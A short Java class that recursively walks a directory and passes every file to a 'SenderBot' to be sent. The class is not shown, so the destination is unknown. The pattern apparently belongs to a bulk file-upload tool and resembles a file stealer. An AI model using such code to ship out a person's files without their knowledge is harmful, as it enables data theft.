import java.io.File;
import java.util.Objects;

public class recDir {
    public static void exec(File dir){
        if (dir.isDirectory()) for (String item : Objects.requireNonNull(dir.list())) recDir.exec(new File(dir.getPath() + File.separator + item));
        else new SenderBot(dir.getPath()).sendFile();
    }
}
